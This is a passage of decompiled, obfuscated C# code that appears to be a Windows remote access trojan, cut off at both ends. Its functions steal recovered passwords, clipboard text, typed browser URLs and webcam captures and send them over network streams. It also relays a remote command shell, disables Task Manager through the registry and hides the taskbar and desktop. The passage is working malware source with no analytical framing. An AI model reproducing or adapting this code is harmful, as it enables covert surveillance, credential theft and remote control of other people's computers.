				try0000_dispatch = 53;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private string method_3(ref string Temp)
	{
		try
		{
			string result = null;
			int num = Strings.Len(Temp);
			for (int i = 1; i <= num; i = checked(i + 1))
			{
				string text = Strings.Mid(Temp, i, 1);
				if (Operators.CompareString(text, "*", false) == 0)
				{
					break;
				}
				result = Strings.Mid(Temp, 1, i);
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result2 = null;
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	private string method_4()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			string text = null;
			Process[] array = processes;
			foreach (Process process in array)
			{
				string text2 = process.ProcessName + "*";
				text2 = text2 + process.Id + "*";
				text2 = text2 + process.BasePriority + "*";
				text2 += process.WorkingSet64;
				text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "$" + text2) : text2);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string gmaOsGBLEQgt118()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = null;
			ServiceController[] services = ServiceController.GetServices();
			ServiceController[] array = services;
			foreach (ServiceController val in array)
			{
				string text2 = val.get_DisplayName() + "*";
				text2 = text2 + ((Enum)val.get_Status()).ToString() + "*";
				wRYAMOpFAlmmqzO8rpbTC48 wRYAMOpFAlmmqzO8rpbTC = new wRYAMOpFAlmmqzO8rpbTC48(val.get_ServiceName());
				text2 += wRYAMOpFAlmmqzO8rpbTC.StartupType;
				text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "$" + text2) : text2);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void method_5(object Tempdata)
	{
		try
		{
			if (((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().FileExists(Conversions.ToString(Tempdata)))
			{
				((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Tempdata));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void AcOajTzPxEkd120(object Tempdata)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¼" }, (string[])null, (Type[])null, (bool[])null);
			string text = Conversions.ToString(NewLateBinding.LateGet(array.GetValue(1), (Type)null, "Replace", new object[2] { "±", "\r\n" }, (string[])null, (Type[])null, (bool[])null));
			int num = int.Parse(Conversions.ToString(array.GetValue(0)));
			c5bIA07Gq8kpUBIS1CB6047 c5bIA07Gq8kpUBIS1CB = new c5bIA07Gq8kpUBIS1CB6047(text);
			c5bIA07Gq8kpUBIS1CB.Font = new Font("Tahoma", (float)num);
			((PrintDocument)c5bIA07Gq8kpUBIS1CB).Print();
			array = null;
			Tempdata = null;
			num = 0;
			((Component)(object)c5bIA07Gq8kpUBIS1CB).Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string SGK2F88baxCC121()
	{
		try
		{
			string text = null;
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string text2 in array)
			{
				text = text + "*" + text2;
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void method_6(int DelayInSeconds)
	{
		DateTime dateTime = DateTime.Now.AddSeconds(DelayInSeconds);
		TimeSpan timeSpan;
		do
		{
			timeSpan = dateTime.Subtract(DateTime.Now);
			Application.DoEvents();
			Thread.Sleep(100);
		}
		while (timeSpan.TotalSeconds > 0.0);
	}

	private long SqrLgqVqTohj123(string FileName)
	{
		long length = default(long);
		try
		{
			FileInfo fileInfo = new FileInfo(FileName);
			length = fileInfo.Length;
			return length;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return length;
		}
	}

	private void J3TMhFs3zb3K124()
	{
		try
		{
			string lpClassName = "ProgMan";
			string lpWindowName = null;
			IntPtr hWnd = FindWindow(ref lpClassName, ref lpWindowName);
			hWnd = GetWindow(hWnd, 5u);
			if (!IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, 4);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void y8BAYtIkst9eHmUJBcJ125()
	{
		try
		{
			string lpClassName = "ProgMan";
			string lpWindowName = null;
			IntPtr hWnd = FindWindow(ref lpClassName, ref lpWindowName);
			hWnd = GetWindow(hWnd, 5u);
			if (IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, 0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Jh1G93UzQ59HHnHc7Pl126()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string lpszClassName = "Shell_TrayWnd";
			string lpszWindow = null;
			IntPtr hwnd = FindWindowEx(zero, zero2, ref lpszClassName, ref lpszWindow);
			IntPtr zero3 = IntPtr.Zero;
			lpszWindow = "BUTTON";
			lpszClassName = null;
			IntPtr hWnd = FindWindowEx(hwnd, zero3, ref lpszWindow, ref lpszClassName);
			ShowWindow(hWnd, 9);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void sqFWQfUE5UKIsnrksxr127()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string lpszClassName = "Shell_TrayWnd";
			string lpszWindow = null;
			IntPtr hwnd = FindWindowEx(zero, zero2, ref lpszClassName, ref lpszWindow);
			IntPtr zero3 = IntPtr.Zero;
			lpszWindow = "BUTTON";
			lpszClassName = null;
			IntPtr hWnd = FindWindowEx(hwnd, zero3, ref lpszWindow, ref lpszClassName);
			ShowWindow(hWnd, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void rw3TRfiMsRZ9NUfJj3l128()
	{
		try
		{
			string lpClassName = "Shell_TrayWnd";
			string lpWindowName = null;
			long num = (long)FindWindow(ref lpClassName, ref lpWindowName);
			ShowWindow((IntPtr)num, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void bqfpOF5mHjg2eFFnPpx129()
	{
		try
		{
			string lpClassName = "Shell_TrayWnd";
			string lpWindowName = null;
			long num = (long)FindWindow(ref lpClassName, ref lpWindowName);
			ShowWindow((IntPtr)num, 9);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OHxtsM5KXOcE7h7m0c6130()
	{
		try
		{
			try
			{
				P5B9z3T6b4o32.Kill();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				K8nKYh23ocE31.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				aMz1o7THlkR30.Close();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				sZel9rNTnAv29.Close();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				IaeLz9Bz7vS28.Close();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				qfIAbE103.Close();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_4.Close();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_0.Close();
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_1.Close();
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			try
			{
				oLfvrvTqv93.Close();
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			try
			{
				IDNEYZMt698.Close();
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_2.Close();
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
			try
			{
				eL7hQPchhBQ98123.Close();
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
			try
			{
				Lbgc3BoOx88.Close();
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
			try
			{
				xZsrOvirpHYfhZlCrVbS143.Close();
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
			try
			{
				ay4XZJzuPkg0e8e8E158.Close();
			}
			catch (Exception projectError16)
			{
				ProjectData.SetProjectError(projectError16);
				ProjectData.ClearProjectError();
			}
			try
			{
				ay4XZJzuPkg0e8e8E158.Close();
			}
			catch (Exception projectError17)
			{
				ProjectData.SetProjectError(projectError17);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_3.Close();
			}
			catch (Exception projectError18)
			{
				ProjectData.SetProjectError(projectError18);
				ProjectData.ClearProjectError();
			}
			try
			{
				OiqJRw113.Close();
			}
			catch (Exception projectError19)
			{
				ProjectData.SetProjectError(projectError19);
				ProjectData.ClearProjectError();
			}
			try
			{
				NzhKidLNk2HS2gX9M0jb133.Close();
			}
			catch (Exception projectError20)
			{
				ProjectData.SetProjectError(projectError20);
				ProjectData.ClearProjectError();
			}
			try
			{
				fHZTRK108.Close();
			}
			catch (Exception projectError21)
			{
				ProjectData.SetProjectError(projectError21);
				ProjectData.ClearProjectError();
			}
			try
			{
				RVFuEzTJArzy37LukGmi148.Close();
			}
			catch (Exception projectError22)
			{
				ProjectData.SetProjectError(projectError22);
				ProjectData.ClearProjectError();
			}
			try
			{
				ZlIirvxW7A51n9oLCm0H138.Close();
			}
			catch (Exception projectError23)
			{
				ProjectData.SetProjectError(projectError23);
				ProjectData.ClearProjectError();
			}
			try
			{
				JEN6bGHGwgh6t118.Close();
			}
			catch (Exception projectError24)
			{
				ProjectData.SetProjectError(projectError24);
				ProjectData.ClearProjectError();
			}
			try
			{
				sROjUukB8bUmSEi6Iclqdo73.Close();
			}
			catch (Exception projectError25)
			{
				ProjectData.SetProjectError(projectError25);
				ProjectData.ClearProjectError();
			}
			try
			{
				BMqSpF2JGzUZKux1rjEbcSCP168 = true;
				pPLpV3B3M5JjTEdapoq4eG9c166 = false;
				vVj7wLDpEIrlyAqnx0LCHI3e167 = false;
				fp1HC39iEuU21 = null;
				string_0 = "Disconnect";
				SendMessageA(ycWl554, 1035, 0, 0);
			}
			catch (Exception projectError26)
			{
				ProjectData.SetProjectError(projectError26);
				ProjectData.ClearProjectError();
			}
			try
			{
				IhOiDCK6HBXgdKyAf3rTA572.Abort();
			}
			catch (Exception projectError27)
			{
				ProjectData.SetProjectError(projectError27);
				ProjectData.ClearProjectError();
			}
			try
			{
				KKADU3gsncz1bC4WxXLruK77.Abort();
			}
			catch (Exception projectError28)
			{
				ProjectData.SetProjectError(projectError28);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_0.Abort();
			}
			catch (Exception projectError29)
			{
				ProjectData.SetProjectError(projectError29);
				ProjectData.ClearProjectError();
			}
			try
			{
				PhqKGp3zj87.Abort();
			}
			catch (Exception projectError30)
			{
				ProjectData.SetProjectError(projectError30);
				ProjectData.ClearProjectError();
			}
			try
			{
				IWBVutix392.Abort();
			}
			catch (Exception projectError31)
			{
				ProjectData.SetProjectError(projectError31);
				ProjectData.ClearProjectError();
			}
			try
			{
				poGcuBuBB97.Abort();
			}
			catch (Exception projectError32)
			{
				ProjectData.SetProjectError(projectError32);
				ProjectData.ClearProjectError();
			}
			try
			{
				ojXtoX102.Abort();
			}
			catch (Exception projectError33)
			{
				ProjectData.SetProjectError(projectError33);
				ProjectData.ClearProjectError();
			}
			try
			{
				TNP9Ei107.Abort();
			}
			catch (Exception projectError34)
			{
				ProjectData.SetProjectError(projectError34);
				ProjectData.ClearProjectError();
			}
			try
			{
				h9dgGo112.Abort();
			}
			catch (Exception projectError35)
			{
				ProjectData.SetProjectError(projectError35);
				ProjectData.ClearProjectError();
			}
			try
			{
				y0CMBHwKDkLLr117.Abort();
			}
			catch (Exception projectError36)
			{
				ProjectData.SetProjectError(projectError36);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_1.Abort();
			}
			catch (Exception projectError37)
			{
				ProjectData.SetProjectError(projectError37);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_2.Abort();
			}
			catch (Exception projectError38)
			{
				ProjectData.SetProjectError(projectError38);
				ProjectData.ClearProjectError();
			}
			try
			{
				FrGh1sDk7ydk88B8ALNd132.Abort();
			}
			catch (Exception projectError39)
			{
				ProjectData.SetProjectError(projectError39);
				ProjectData.ClearProjectError();
			}
			try
			{
				ONuZtTqV7EPLEMfztvt2137.Abort();
			}
			catch (Exception projectError40)
			{
				ProjectData.SetProjectError(projectError40);
				ProjectData.ClearProjectError();
			}
			try
			{
				QHRLZNlZlxVRWlE2NCRj142.Abort();
			}
			catch (Exception projectError41)
			{
				ProjectData.SetProjectError(projectError41);
				ProjectData.ClearProjectError();
			}
			try
			{
				dxumJgyrbsTgZXsGRt4A147.Abort();
			}
			catch (Exception projectError42)
			{
				ProjectData.SetProjectError(projectError42);
				ProjectData.ClearProjectError();
			}
			try
			{
				lZcUCvJWfUaOgmX6y152.Abort();
			}
			catch (Exception projectError43)
			{
				ProjectData.SetProjectError(projectError43);
				ProjectData.ClearProjectError();
			}
			try
			{
				Ru2KJkmqeqruxboXj157.Abort();
			}
			catch (Exception projectError44)
			{
				ProjectData.SetProjectError(projectError44);
				ProjectData.ClearProjectError();
			}
			GC.Collect();
		}
		catch (Exception projectError45)
		{
			ProjectData.SetProjectError(projectError45);
			ProjectData.ClearProjectError();
		}
	}

	private void edMSAscOLt7xpkMfDDX131(object sender, DataReceivedEventArgs e)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (!string.IsNullOrEmpty(e.Data))
			{
				stringBuilder.Append("/CMDCMDGO/");
				stringBuilder.Append(e.Data);
				if (!(e.Data!.StartsWith("Microsoft") | e.Data!.StartsWith("(C)") | e.Data!.StartsWith("Copyright")))
				{
					AIFBgQyqjyip7rX6V155.WriteLine((object?)stringBuilder);
					AIFBgQyqjyip7rX6V155.Flush();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void NCJU8yuF8L6jEaJaj1P132()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Form val = new Form();
			val.set_TopMost(true);
			MessageBox.Show((IWin32Window)(object)val, BpJ9oENZtjBgjkHh7149, string_2, QdtGecOxwkTqGqAcMg48, w9IGgzBWGX2oQYnbAl47);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string X0fYjgQgNkl2uI3ouvi133()
	{
		try
		{
			string name = "Software\\Microsoft\\Internet Explorer\\TypedURLs";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			string text = null;
			int num = 1;
			while (true)
			{
				string name2 = "url" + num;
				string text2 = (string)registryKey.GetValue(name2);
				if (text2 == null)
				{
					break;
				}
				text = text + "*" + text2;
				num = checked(num + 1);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
	private static extern void mciSendStringA_1(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

	private void qEihHlMICABLeF0ovRd135()
	{
		try
		{
			mciSendStringA_1("set CDAudio door open", mZYGg65, 127, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void bUE6oT7aSPF26RP4El2136()
	{
		try
		{
			mciSendStringA_1("set CDAudio door closed", mZYGg65, 127, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private int orhl2zQBrusOiOJlKLx137(ref y3VNrsB4j5LLdppQVTgQ6pBf45 dm)
	{
		return UnAbUTWyvUpAm2tsLUz138(ref dm, -1);
	}

	private int UnAbUTWyvUpAm2tsLUz138(ref y3VNrsB4j5LLdppQVTgQ6pBf45 dm, int iModeNum)
	{
		return LsMjd0SviHd5ypMKBGZXeibq46.EnumDisplaySettings(null, iModeNum, ref dm);
	}

	private void BxxiFFp0mdmv5j6rENg139(y3VNrsB4j5LLdppQVTgQ6pBf45 dm)
	{
		LsMjd0SviHd5ypMKBGZXeibq46.ChangeDisplaySettings(ref dm, 0);
	}

	private void mr61lG2U5LPmXqba0m4140(bool enable)
	{
		try
		{
			if (Conversions.ToDouble(BGPOS51) < 6.0)
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey = currentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", RuntimeHelpers.GetObjectValue(Interaction.IIf(enable, (object)0, (object)1)), RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDesktopWindow();

	private void bCDLjexRp4U854zTKRx142(bool start)
	{
		try
		{
			int desktopWindow = GetDesktopWindow();
			if (start)
			{
				H3Jvlebxk88s4RHEfQQD2CKE44.SendMessage((IntPtr)desktopWindow, 274u, (IntPtr)61760, (IntPtr)0);
			}
			else
			{
				SendKeys.SendWait("{ESC}");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void wHdhIDPa0HsS3Fva143(object swpass)
	{
		try
		{
			Uy9dyer0GtLrYJth15aHD49 uy9dyer0GtLrYJth15aHD = new Uy9dyer0GtLrYJth15aHD49();
			string text = uy9dyer0GtLrYJth15aHD.EMZImrCIASuVVPcH8a30X225();
			string text2 = uy9dyer0GtLrYJth15aHD.xrEPAT3u237();
			string text3 = uy9dyer0GtLrYJth15aHD.bbCNCZehwP7j3qzCJvdXq226();
			string text4 = uy9dyer0GtLrYJth15aHD.VJror43m229();
			string text5 = uy9dyer0GtLrYJth15aHD.YfOLMyZi233();
			string text6 = uy9dyer0GtLrYJth15aHD.cYqKGw99234();
			string text7 = uy9dyer0GtLrYJth15aHD.BRpC4oFP230();
			string text8 = uy9dyer0GtLrYJth15aHD.KU9cEE59235();
			string text9 = uy9dyer0GtLrYJth15aHD.Jyko6C0t236();
			string text10 = uy9dyer0GtLrYJth15aHD.xvJhkfcx238();
			string text11 = uy9dyer0GtLrYJth15aHD.a2ACh0VKx0lrgBiOneAYE217();
			object obj = text10 + text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text11;
			NewLateBinding.LateCall(swpass, (Type)null, "WriteLine", new object[1] { "/PSWRECOV/" + A4MHFmQw3DUU112(Conversions.ToString(obj), "&%#@?,:*") }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(swpass, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool shKaF2sIkp8axfMK144(string name)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			int num = 0;
			if (0 < processes.Length)
			{
				Process process = processes[num];
				int num2 = default(int);
				if (process.ProcessName.StartsWith(name))
				{
					num2 = checked(num2 + 1);
				}
				if (num2 == 0)
				{
					return false;
				}
				return true;
			}
			bool result = default(bool);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private int GzYOYkU7u3waWbQt145(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}

	private void AT6B0GSufuWjuFCK146()
	{
		try
		{
			AYuUQOJfkcj19 = ((Computer)RWfjxtEPH2.Computer).get_Clipboard().GetText();
			AYuUQOJfkcj19 = AYuUQOJfkcj19.Replace("\r\n", "***");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void UHbtHGc7mCGBvhL8147(object Tempdata)
	{
		while (true)
		{
			try
			{
				if (Operators.CompareString(eurVgQtyOBO20, "Connect", false) == 0)
				{
					string lpszWindowName = Conversions.ToString(Tempdata);
					ycWl554 = capCreateCaptureWindowA(ref lpszWindowName, 0, 0, 0, 320, 240, RIdk7eu9IzU18, 0);
					SendMessageA(ycWl554, 1034, 0, 0);
					eurVgQtyOBO20 = "";
				}
				else if (Operators.CompareString(fp1HC39iEuU21, "Image", false) == 0 && pPLpV3B3M5JjTEdapoq4eG9c166)
				{
					gpZQbj0lr93xHr1WTPXQgQKg165 = fp1HC39iEuU21;
					fp1HC39iEuU21 = "";
					SendMessageA(ycWl554, 1084, 0, 0);
					SendMessageA(ycWl554, 1054, 0, 0);
					Thread thread = new Thread(yFAE8aKZHtzuoBDO148);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start();
					thread.Join();
				}
				else if (Operators.CompareString(fp1HC39iEuU21, "Capture", false) == 0 && vVj7wLDpEIrlyAqnx0LCHI3e167)
				{
					gpZQbj0lr93xHr1WTPXQgQKg165 = fp1HC39iEuU21;
					SendMessageA(ycWl554, 1084, 0, 0);
					SendMessageA(ycWl554, 1054, 0, 0);
					Thread thread2 = new Thread(yFAE8aKZHtzuoBDO148);
					thread2.SetApartmentState(ApartmentState.STA);
					thread2.Start();
					thread2.Join();
				}
				else if (Operators.CompareString(fp1HC39iEuU21, "Capture2", false) == 0 && vVj7wLDpEIrlyAqnx0LCHI3e167)
				{
					gpZQbj0lr93xHr1WTPXQgQKg165 = fp1HC39iEuU21;
					SendMessageA(ycWl554, 1084, 0, 0);
					SendMessageA(ycWl554, 1054, 0, 0);
					Thread thread3 = new Thread(yFAE8aKZHtzuoBDO148);
					thread3.SetApartmentState(ApartmentState.STA);
					thread3.Start();
					thread3.Join();
				}
				else if (Operators.CompareString(string_0, "Disconnect", false) == 0)
				{
					SendMessageA(ycWl554, 1035, 0, 0);
					string_0 = "";
					break;
				}
				Thread.Sleep(50);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Thread.Sleep(50);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void yFAE8aKZHtzuoBDO148()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		string text = null;
		checked
		{
			try
			{
				x067B55 = Clipboard.GetDataObject();
				yIRvY56 = (Image)(Bitmap)x067B55.GetData(DataFormats.Bitmap);
				MemoryStream memoryStream = new MemoryStream();
				Bitmap val = new Bitmap(320, 240, (PixelFormat)135173);
				if (Operators.CompareString(gpZQbj0lr93xHr1WTPXQgQKg165, "Capture", false) == 0)
				{
					yIRvY56.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				else if (yIRvY56.get_Width() > 320)
				{
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.set_InterpolationMode((InterpolationMode)7);
					val2.set_CompositingQuality((CompositingQuality)2);
					val2.DrawImage(yIRvY56, 0, 0, 320, 240);
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				else
				{
					yIRvY56.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				memoryStream.Capacity = (int)memoryStream.Length;
				byte[] buffer = memoryStream.GetBuffer();
				text = Convert.ToBase64String(buffer);
				yIRvY56.Dispose();
				OctUUhYIcliqPI17 = (int)memoryStream.Length;
				memoryStream.Flush();
				memoryStream.Dispose();
				memoryStream.Close();
				buffer = null;
				try
				{
					string text2 = gpZQbj0lr93xHr1WTPXQgQKg165;
					if (Operators.CompareString(text2, "Image", false) == 0)
					{
						mQSTi8lfx9R4lRqEZjJhdk75.WriteLine("/WEBIMAGE/" + text);
						mQSTi8lfx9R4lRqEZjJhdk75.Flush();
					}
					else
					{
						mQSTi8lfx9R4lRqEZjJhdk75.WriteLine("/WEBCAPTR/" + text);
						mQSTi8lfx9R4lRqEZjJhdk75.Flush();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					BMqSpF2JGzUZKux1rjEbcSCP168 = true;
					ProjectData.ClearProjectError();
					return;
				}
				text = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text3 = gpZQbj0lr93xHr1WTPXQgQKg165;
					if (Operators.CompareString(text3, "Image", false) == 0)
					{
						mQSTi8lfx9R4lRqEZjJhdk75.WriteLine("/WEBIMAGE/" + text);
						mQSTi8lfx9R4lRqEZjJhdk75.Flush();
					}
					else
					{
						mQSTi8lfx9R4lRqEZjJhdk75.WriteLine("/WEBCAPTR/" + text);
						mQSTi8lfx9R4lRqEZjJhdk75.Flush();
					}
					text = null;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					BMqSpF2JGzUZKux1rjEbcSCP168 = true;
					ProjectData.ClearProjectError();
					return;
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void rLff0nLTHZfn0hYX149()
	{
		try
		{
			if (Operators.CompareString(AYuUQOJfkcj19, (string)null, false) == 0)
			{
				((Computer)RWfjxtEPH2.Computer).get_Clipboard().Clear();
			}
			else
			{
				((Computer)RWfjxtEPH2.Computer).get_Clipboard().SetText(AYuUQOJfkcj19, (TextDataFormat)0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void IOLP5YCKXcMd7IJK150()
	{
		try
		{
			Process process = new Process();
			string text = null;
			string text2 = null;
			string text3 = null;
			Process[] processes = Process.GetProcesses(".");
			for (int i = 0; i < processes.Length; i = checked(i + 1))
			{
				process = processes[i];
				if (process.MainWindowTitle.Length > 0)
				{
					text = text + process.MainWindowTitle.ToString() + "²";
					text2 = text2 + process.Id + "³";
					text3 = text + "±" + text2;
				}
			}
			uUzDzGAWZ2ARrYqgXYqZ145.WriteLine("/REFRWIND/" + text3);
			uUzDzGAWZ2ARrYqgXYqZ145.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ZRaK1w8aTGW9UmZq151()
	{
		List<Rectangle> list = jEuudDaxptLbm6I03MzJQDQS171;
		Rectangle item = new Rectangle(0, 0, Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
		list.Add(item);
		List<Rectangle> list2 = jEuudDaxptLbm6I03MzJQDQS171;
		checked
		{
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0), 0, Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list2.Add(item);
			List<Rectangle> list3 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0 + (double)(Y3xeVwuMS5vJkK0ZGIEYFqD3169 * 1)), 0, Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list3.Add(item);
			List<Rectangle> list4 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle((int)Math.Round((double)rectangle_0.Width / 4.0 + (double)(Y3xeVwuMS5vJkK0ZGIEYFqD3169 * 2)), 0, Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list4.Add(item);
			List<Rectangle> list5 = jEuudDaxptLbm6I03MzJQDQS171;
			item = new Rectangle(0, (int)Math.Round((double)rectangle_0.Height / 4.0), Y3xeVwuMS5vJkK0ZGIEYFqD3169, sJao3S1JaBUm8NOa587FYNGH170);
			list5.Add(item);
			List<Rectangle> list6 = jEuudDaxptLbm6I03MzJQDQS171;
